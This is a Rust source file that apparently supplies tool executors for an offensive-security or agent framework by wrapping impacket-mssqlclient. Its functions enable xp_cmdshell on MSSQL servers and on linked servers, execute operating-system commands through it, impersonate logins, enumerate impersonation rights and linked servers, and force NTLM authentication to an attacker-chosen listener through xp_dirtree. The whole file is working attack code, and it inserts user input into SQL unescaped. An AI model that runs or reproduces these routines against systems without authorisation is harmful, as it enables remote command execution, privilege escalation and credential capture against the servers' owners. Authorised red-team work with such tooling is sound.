//! MSSQL tool executors.

use anyhow::Result;
use serde_json::Value;

use crate::args::{optional_bool, optional_str, required_str};
use crate::credentials;
use crate::executor::CommandBuilder;
use crate::ToolOutput;

/// Build common MSSQL command prefix with auth and optional -windows-auth flag.
fn mssql_base(
    domain: Option<&str>,
    username: &str,
    password: Option<&str>,
    target: &str,
    windows_auth: bool,
) -> CommandBuilder {
    let auth_str = credentials::impacket_target(domain, username, password, target);

    CommandBuilder::new("impacket-mssqlclient")
        .arg(&auth_str)
        .arg_if(windows_auth, "-windows-auth")
        .timeout_secs(120)
}

/// Pipe a SQL query via stdin to an mssqlclient CommandBuilder and execute.
async fn mssql_query(cmd: CommandBuilder, query: &str) -> Result<ToolOutput> {
    cmd.stdin(format!("{query}\nexit\n")).execute().await
}

/// Extract common MSSQL args from JSON and build a base CommandBuilder.
fn mssql_from_args(args: &Value) -> Result<CommandBuilder> {
    let target = required_str(args, "target")?;
    let username = required_str(args, "username")?;
    let password = optional_str(args, "password");
    let domain = optional_str(args, "domain");
    let windows_auth = optional_bool(args, "windows_auth").unwrap_or(false);

    Ok(mssql_base(domain, username, password, target, windows_auth))
}

/// Execute a SQL command via impacket-mssqlclient.
///
/// Required args: `target`, `username`, `command`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_command(args: &Value) -> Result<ToolOutput> {
    let command = required_str(args, "command")?;

    mssql_query(mssql_from_args(args)?, command).await
}

/// Enable xp_cmdshell on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`, `impersonate_user`
pub async fn mssql_enable_xp_cmdshell(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = optional_str(args, "impersonate_user");
    let base_query = "EXEC sp_configure 'show advanced options', 1; RECONFIGURE; \
                      EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;";

    let query = match impersonate_user {
        Some(user) => format!("EXECUTE AS LOGIN = '{user}'; {base_query}"),
        None => base_query.to_string(),
    };

    mssql_query(mssql_from_args(args)?, &query).await
}

/// Enumerate impersonation permissions on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enum_impersonation(args: &Value) -> Result<ToolOutput> {
    let query = "SELECT * FROM sys.server_permissions WHERE type = 'IM';";

    mssql_query(mssql_from_args(args)?, query).await
}

/// Impersonate a login and execute a query on a MSSQL server.
///
/// Required args: `target`, `username`, `impersonate_user`, `query`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_impersonate(args: &Value) -> Result<ToolOutput> {
    let impersonate_user = required_str(args, "impersonate_user")?;
    let query = required_str(args, "query")?;

    let full_query = format!("EXECUTE AS LOGIN = '{impersonate_user}'; {query}");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Enumerate linked servers on a MSSQL server.
///
/// Required args: `target`, `username`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_enum_linked_servers(args: &Value) -> Result<ToolOutput> {
    mssql_query(mssql_from_args(args)?, "EXEC sp_linkedservers;").await
}

/// Execute a query on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `query`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_exec_linked(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let query = required_str(args, "query")?;

    let full_query = format!("EXEC ('{query}') AT [{linked_server}];");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Enable xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_linked_enable_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;

    let full_query = format!(
        "EXEC ('sp_configure ''show advanced options'', 1; RECONFIGURE; \
         EXEC sp_configure ''xp_cmdshell'', 1; RECONFIGURE;') AT [{linked_server}];"
    );

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Execute a command via xp_cmdshell on a linked MSSQL server.
///
/// Required args: `target`, `username`, `linked_server`, `command`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_linked_xpcmdshell(args: &Value) -> Result<ToolOutput> {
    let linked_server = required_str(args, "linked_server")?;
    let command = required_str(args, "command")?;

    let full_query = format!("EXEC ('xp_cmdshell ''{command}''') AT [{linked_server}];");

    mssql_query(mssql_from_args(args)?, &full_query).await
}

/// Coerce NTLM authentication from a MSSQL server via xp_dirtree.
///
/// Required args: `target`, `username`, `listener_ip`
/// Optional args: `password`, `domain`, `windows_auth`
pub async fn mssql_ntlm_coerce(args: &Value) -> Result<ToolOutput> {
    let listener_ip = required_str(args, "listener_ip")?;

    let full_query = format!("EXEC master..xp_dirtree '\\\\{listener_ip}\\share'");

    mssql_query(mssql_from_args(args)?, &full_query).await
}
